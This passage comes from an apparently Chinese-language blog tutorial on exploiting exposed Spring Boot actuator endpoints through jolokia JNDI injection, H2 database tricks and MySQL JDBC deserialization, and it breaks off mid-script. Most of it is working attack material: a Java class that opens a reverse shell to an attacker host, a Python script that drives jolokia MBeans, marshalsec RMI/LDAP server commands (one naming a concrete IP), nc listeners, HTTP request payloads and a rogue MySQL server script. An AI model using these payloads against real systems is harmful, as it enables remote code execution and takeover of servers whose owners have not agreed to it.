<p>⚠️ 如果目标成功请求了example.xml 并且 marshalsec 也接收到了目标请求，但是目标没有请求 JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。</p>
</blockquote>
<p>替换实际的 your-vps-ip 地址访问 URL 触发漏洞：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/your-vps-ip!/example.xml</span><br></pre></td></tr></table></figure>

<p>测试：</p>
<p>访问URL</p>
<p><img src="https://s2.loli.net/2022/06/26/gEFH3WvIuZCTJoM.png" alt="image-20220626021601495"></p>
<p>HTTP 服务看到请求记录</p>
<p><img src="https://s2.loli.net/2022/06/26/dTlEHXMhZsBGzoF.png" alt="image-20220626021543950"></p>
<p>marshalsec 也接收到了目标请求</p>
<p><img src="https://s2.loli.net/2022/06/26/U872JSnuCvNfrs3.png" alt="image-20220626021619867"></p>
<p>漏洞原理：</p>
<ol>
<li>直接访问可触发漏洞的 URL，相当于通过 jolokia 调用 <code>ch.qos.logback.classic.jmx.JMXConfigurator</code> 类的 <code>reloadByURL</code> 方法</li>
<li>目标机器请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容</li>
<li>目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)</li>
<li>xml 文件中利用 <code>logback</code> 依赖的 <code>insertFormJNDI</code> 标签，设置了外部 JNDI 服务器地址</li>
<li>目标机器请求恶意 JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞</li>
</ol>
<h4 id="jolokia-Realm-JNDI-RCE"><a href="#jolokia-Realm-JNDI-RCE" class="headerlink" title="jolokia Realm JNDI RCE"></a>jolokia Realm JNDI RCE</h4><p>利用条件：</p>
<ul>
<li>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</li>
<li>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关 MBean</li>
<li>目标可以请求攻击者的服务器（请求可出外网）</li>
<li>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u141&#x2F;7u131&#x2F;8u121(RMI)，但相关环境可绕过</li>
</ul>
<p>利用方法：</p>
<p>步骤一：查看已存在的 MBeans</p>
<p>访问 <code>/jolokia/list</code> 接口，查看是否存在 <code>type=MBeanFactory</code> 和 <code>createJNDIRealm</code> 关键词。</p>
<p>步骤二：准备要执行的 Java 代码</p>
<p>编写优化过后的用来反弹 shell 的java代码<code>JNDIObject.java</code>。</p>
<p>步骤三：托管 class 文件</p>
<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用 python 快速开启 http server</span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>

<p>将<strong>步骤二</strong>中编译好的 class 文件拷贝到 HTTP 服务器根目录。</p>
<p>步骤四：架设恶意 rmi 服务</p>
<p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 rmi 服务：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://your-vps-ip:80/#JNDIObject 1389</span><br><span class="line"></span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://42.194.149.25:80/#JNDIObject 1389</span><br></pre></td></tr></table></figure>

<p>步骤五：监听反弹 shell 的端口</p>
<p>一般使用 nc 监听端口，等待反弹 shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvp 443</span><br></pre></td></tr></table></figure>

<p>步骤六：发送恶意 payload</p>
<p>根据实际情况修改 springboot-realm-jndi-rce.py 脚本中的目标地址，RMI 地址、端口等信息，然后在自己控制的服务器上运行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment"># Referer: https://ricterz.me/posts/2019-03-06-yet-another-way-to-exploit-spring-boot-actuators-via-jolokia.txt</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1:9094/jolokia&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create_realm = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:type=MBeanFactory&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;createJNDIRealm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: [<span class="string">&quot;Tomcat:type=Engine&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wirte_factory = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;WRITE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;attribute&quot;</span>: <span class="string">&quot;contextFactory&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">write_url = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;WRITE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;attribute&quot;</span>: <span class="string">&quot;connectionURL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;rmi://vps-ip:1389/JNDIObject&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stop = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;stop&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: []</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">start = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;start&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: []</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">flow = [create_realm, wirte_factory, write_url, stop, start]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flow:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%s MBean %s: %s ...&#x27;</span> % (i[<span class="string">&#x27;type&#x27;</span>].title(), i[<span class="string">&#x27;mbean&#x27;</span>], i.get(<span class="string">&#x27;operation&#x27;</span>, i.get(<span class="string">&#x27;attribute&#x27;</span>))))</span><br><span class="line">    r = requests.post(url, json=i)</span><br><span class="line">    r.json()</span><br><span class="line">    <span class="built_in">print</span>(r.status_code)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>测试：</p>
<p>JNDIObject.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  javac -source 1.5 -target 1.5 JNDIObject.java</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  Build By LandGrey</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIObject</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> <span class="string">&quot;your-vps-ip&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">port</span> <span class="operator">=</span> <span class="string">&quot;443&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">py_path</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            String[] cmd;</span><br><span class="line">            <span class="keyword">if</span> (!System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;windows&quot;</span>)) &#123;</span><br><span class="line">                String[] py_envs = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/python&quot;</span>, <span class="string">&quot;/bin/python3&quot;</span>, <span class="string">&quot;/usr/bin/python&quot;</span>, <span class="string">&quot;/usr/bin/python3&quot;</span>, <span class="string">&quot;/usr/local/bin/python&quot;</span>, <span class="string">&quot;/usr/local/bin/python3&quot;</span>&#125;;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; py_envs.length; ++i) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">py</span> <span class="operator">=</span> py_envs[i];</span><br><span class="line">                    <span class="keyword">if</span> ((<span class="keyword">new</span> <span class="title class_">File</span>(py)).exists()) &#123;</span><br><span class="line">                        py_path = py;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (py_path != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/bin/bash&quot;</span>)).exists()) &#123;</span><br><span class="line">                        cmd = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;py_path, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;import pty;pty.spawn(\&quot;/bin/bash\&quot;)&quot;</span>&#125;;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        cmd = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;py_path, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;import pty;pty.spawn(\&quot;/bin/sh\&quot;)&quot;</span>&#125;;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/bin/bash&quot;</span>)).exists()) &#123;</span><br><span class="line">                        cmd = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>&#125;;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        cmd = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>&#125;;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cmd = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> (<span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmd)).redirectErrorStream(<span class="literal">true</span>).start();</span><br><span class="line">            <span class="type">Socket</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(ip, Integer.parseInt(port));</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">pi</span> <span class="operator">=</span> p.getInputStream();</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">pe</span> <span class="operator">=</span> p.getErrorStream();</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">si</span> <span class="operator">=</span> s.getInputStream();</span><br><span class="line">            <span class="type">OutputStream</span> <span class="variable">po</span> <span class="operator">=</span> p.getOutputStream();</span><br><span class="line">            <span class="type">OutputStream</span> <span class="variable">so</span> <span class="operator">=</span> s.getOutputStream();</span><br><span class="line">            <span class="keyword">while</span>(!s.isClosed()) &#123;</span><br><span class="line">                <span class="keyword">while</span>(pi.available() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    so.write(pi.read());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">while</span>(pe.available() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    so.write(pe.read());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">while</span>(si.available() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    po.write(si.read());</span><br><span class="line">                &#125;</span><br><span class="line">                so.flush();</span><br><span class="line">                po.flush();</span><br><span class="line">                Thread.sleep(<span class="number">50L</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    p.exitValue();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            p.destroy();</span><br><span class="line">            s.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Throwable e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>命令执行成功</p>
<p><img src="https://s2.loli.net/2022/06/26/9Jqibsr7QIeC4Dl.png" alt="image-20220626021705177"></p>
<p>HTTP 服务受到请求</p>
<p><img src="https://s2.loli.net/2022/06/26/6Ygbx8NZVtpJQ1D.png" alt="image-20220626022312573"></p>
<p>marshalsec 也接收到了目标请求</p>
<p><img src="https://s2.loli.net/2022/06/26/uct47WAQGvl9JsD.png" alt="image-20220626021741930"></p>
<p>漏洞原理：</p>
<ol>
<li>利用 jolokia 调用 createJNDIRealm 创建 JNDIRealm</li>
<li>设置 connectionURL 地址为 RMI Service URL</li>
<li>设置 contextFactory 为 RegistryContextFactory</li>
<li>停止 Realm</li>
<li>启动 Realm 以触发指定 RMI 地址的 JNDI 注入，造成 RCE 漏洞</li>
</ol>
<h4 id="restart-h2-database-query-RCE"><a href="#restart-h2-database-query-RCE" class="headerlink" title="restart h2 database query RCE"></a>restart h2 database query RCE</h4><p>利用条件：</p>
<ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li>
<li>存在 <code>com.h2database.h2</code> 依赖（版本要求暂未知）</li>
</ul>
<p>步骤一：设置 spring.datasource.hikari.connection-test-query 属性</p>
<blockquote>
<p>⚠️ 下面payload 中的 ‘T5’ 方法每一次执行命令后都需要更换名称 (如 T6) ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发</p>
</blockquote>
<p>spring 1.x（无回显执行命令）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T5(&#x27;cmd&#x27;,&#x27;/c&#x27;,&#x27;calc&#x27;);</span><br></pre></td></tr></table></figure>

<p>spring 2.x（无回显执行命令）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS T5 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T5(&#x27;cmd&#x27;,&#x27;/c&#x27;,&#x27;calc&#x27;);&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>步骤二：重启应用</p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure>

<p>测试：</p>
<p>POST 设置属性值</p>
<p><img src="https://s2.loli.net/2022/06/26/BTXYNuQ6Ef8O9Cr.png" alt="image-20220626022352954"></p>
<p>请求 <code>/restart</code> 接口，即可触发</p>
<p><img src="https://s2.loli.net/2022/06/26/ygYOsPQakUwq3lr.png" alt="image-20220626022403101"></p>
<p>漏洞原理：</p>
<ol>
<li>spring.datasource.hikari.connection-test-query 属性被设置为一条恶意的 <code>CREATE ALIAS</code> 创建自定义函数的 SQL 语句</li>
<li>其属性对应 HikariCP 数据库连接池的 connectionTestQuery 配置，定义一个新数据库连接之前被执行的 SQL 语句</li>
<li>restart 重启应用，会建立新的数据库连接</li>
<li>如果 SQL 语句中的自定义函数还没有被执行过，那么自定义函数就会被执行，造成 RCE 漏洞</li>
</ol>
<h4 id="h2-database-console-JNDI-RCE"><a href="#h2-database-console-JNDI-RCE" class="headerlink" title="h2 database console JNDI RCE"></a>h2 database console JNDI RCE</h4><p>利用条件：</p>
<ul>
<li>存在 <code>com.h2database.h2</code> 依赖（版本要求暂未知）</li>
<li>spring 配置中启用 h2 console <code>spring.h2.console.enabled=true</code></li>
<li>目标可以请求攻击者的服务器（请求可出外网）</li>
<li>JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201&#x2F;7u191&#x2F;8u182&#x2F;11.0.1（LDAP 方式）</li>
</ul>
<p>利用方法：</p>
<p>步骤一：访问路由获得 jsessionid</p>
<p>直接访问目标开启 h2 console 的默认路由 <code>/h2-console</code>，目标会跳转到页面 <code>/h2-console/login.jsp?jsessionid=xxxxxx</code>，记录下实际的 <code>jsessionid=xxxxxx</code> 值。</p>
<p>步骤二：准备要执行的 Java 代码</p>
<p>编写优化过后的用来反弹 shell 的java代码<code>JNDIObject.java</code>，</p>
<p>使用兼容低版本 jdk 的方式编译：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac -source 1.5 -target 1.5 JNDIObject.java</span><br></pre></td></tr></table></figure>

<p>然后将生成的 <code>JNDIObject.class</code> 文件拷贝到 <strong>步骤二</strong> 中的网站根目录。</p>
<p>步骤三：托管 class 文件</p>
<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用 python 快速开启 http server</span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>

<p>将<strong>步骤二</strong>中编译好的 class 文件拷贝到 HTTP 服务器根目录。</p>
<p>步骤四：架设恶意 ldap 服务</p>
<p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 ldap 服务：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389</span><br></pre></td></tr></table></figure>

<p>步骤五：监听反弹 shell 的端口</p>
<p>一般使用 nc 监听端口，等待反弹 shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lv 443</span><br></pre></td></tr></table></figure>

<p>步骤六：发包触发 JNDI 注入</p>
<p>根据实际情况，替换下面数据中的 <code>jsessionid=xxxxxx</code>、<code>www.example.com</code> 和 <code>ldap://your-vps-ip:1389/JNDIObject</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /h2-console/login.do?jsessionid=xxxxxx</span><br><span class="line">Host: www.example.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Referer: http://www.example.com/h2-console/login.jsp?jsessionid=xxxxxx</span><br><span class="line"></span><br><span class="line">language=en&amp;setting=Generic+H2+%28Embedded%29&amp;name=Generic+H2+%28Embedded%29&amp;driver=javax.naming.InitialContext&amp;url=ldap://your-vps-ip:1389/JNDIObject&amp;user=&amp;password=</span><br></pre></td></tr></table></figure>

<p>测试：</p>
<p>访问h2控制台</p>
<p><img src="https://s2.loli.net/2022/06/26/cwkdy6Eej74gXvK.png" alt="image-20220626022436323"></p>
<p>发送如下数据包，url改为ldap的地址，发送即可触发RCE</p>
<p><img src="https://s2.loli.net/2022/06/26/MT9dB7rCnYs8IvU.png" alt="image-20220626022447977"></p>
<p>marshalsec 接收到了目标请求</p>
<p><img src="https://s2.loli.net/2022/06/26/1tHys2CqMkm3voK.png" alt="image-20220626022505695"></p>
<p>HTTP 也接到了请求</p>
<p><img src="https://s2.loli.net/2022/06/26/Ug4msGvIkTAS3Va.png" alt="image-20220626022519608"></p>
<h4 id="mysql-jdbc-deserialization-RCE"><a href="#mysql-jdbc-deserialization-RCE" class="headerlink" title="mysql jdbc deserialization RCE"></a>mysql jdbc deserialization RCE</h4><p>利用条件：</p>
<ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li>
<li>目标环境中存在 <code>mysql-connector-java</code> 依赖</li>
<li>目标可以请求攻击者的服务器（请求可出外网）</li>
</ul>
<p>步骤一：查看环境依赖</p>
<p>GET 请求 <code>/env</code> 或 <code>/actuator/env</code>，搜索环境变量（classpath）中是否有 <code>mysql-connector-java</code> 关键词，并记录下其版本号（5.x 或 8.x）；</p>
<p>搜索并观察环境变量中是否存在常见的反序列化 gadget 依赖，比如 <code>commons-collections</code>、<code>Jdk7u21</code>、<code>Jdk8u20</code> 等；</p>
<p>搜索 <code>spring.datasource.url</code> 关键词，记录下其 <code>value</code> 值，方便后续恢复其正常 jdbc url 值。</p>
<p>步骤二：架设恶意 rogue mysql server</p>
<p>在自己控制的服务器上运行 springboot-jdbc-deserialization-rce.py 脚本，并使用 <a href="https://github.com/frohoff/ysoserial">ysoserial</a> 自定义要执行的命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections3 calc &gt; payload.ser</span><br></pre></td></tr></table></figure>

<p>在脚本<strong>同目录下</strong>生成 <code>payload.ser</code> 反序列化 payload 文件，供脚本使用。</p>
<p>步骤三：设置 spring.datasource.url 属性</p>
<blockquote>
<p>⚠️ 修改此属性会暂时导致网站所有的正常数据库服务不可用，会对业务造成影响，请谨慎操作！</p>
</blockquote>
<p>mysql-connector-java 5.x 版本设置<strong>属性值</strong>为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true</span><br></pre></td></tr></table></figure>

<p>mysql-connector-java 8.x 版本设置<strong>属性值</strong>为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true</span><br></pre></td></tr></table></figure>

<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.datasource.url=对应属性值</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.url&quot;,&quot;value&quot;:&quot;对应属性值&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>步骤四：刷新配置</p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure>

<p>步骤五：触发数据库查询</p>
<p>尝试访问网站已知的数据库查询的接口，例如： <code>/product/list</code> ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发</p>
<p>步骤六：恢复正常 jdbc url</p>
<p>反序列化漏洞利用完成后，使用 <strong>步骤三</strong> 的方法恢复 <strong>步骤一</strong> 中记录的 <code>spring.datasource.url</code> 的原始 <code>value</code> 值</p>
<p>测试：</p>
<p>利用yso生成恶意的序列化数据并保存在payload.ser文件中，这里采用cc6这条链，因为前几条受jdk版本的影响可能导致反序列化触发命令会失败</p>
<p><img src="https://s2.loli.net/2022/06/26/Ir3lxzGHTBwZp2C.png" alt="image-20220626095233175"></p>
<p>vps上运行 springboot-jdbc-deserialization-rce.py 脚本，开启一个恶意的 mysql server</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment"># -**- Author: LandGrey -**-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">server_send</span>(<span class="params">conn, payload</span>):</span><br><span class="line">    <span class="keyword">global</span> count</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Package order: &#123;&#125;, Send: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(count, payload))</span><br><span class="line">    conn.send(binascii.a2b_hex(payload))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">server_receive</span>(<span class="params">conn</span>):</span><br><span class="line">    <span class="keyword">global</span> count, BUFFER_SIZE</span><br><span class="line"></span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    data = conn.recv(BUFFER_SIZE)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Package order: &#123;&#125;, Receive: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(count, data))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(data).lower()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_mysql_server</span>():</span><br><span class="line">    <span class="keyword">global</span> count, deserialization_payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        conn, addr = server_socks.accept()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Connection from client -&gt; &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(addr[<span class="number">0</span>], addr[<span class="number">1</span>]))</span><br><span class="line">        greeting = <span class="string">&#x27;4a0000000a352e372e323900160000006c7a5d420d107a7700ffff080200ffc11500000000000000000000566d1a0a796d3e1338313747006d7973716c5f6e61746976655f70617373776f726400&#x27;</span></span><br><span class="line">        server_send(conn, greeting)</span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(deserialization_file):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(deserialization_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> _f:</span><br><span class="line">                deserialization_payload = binascii.b2a_hex(_f.read())</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># client auth</span></span><br><span class="line">            server_receive(conn)</span><br><span class="line">            server_send(conn, response_ok)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># client query</span></span><br><span class="line">            data = server_receive(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;session.auto_increment_increment&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload = <span 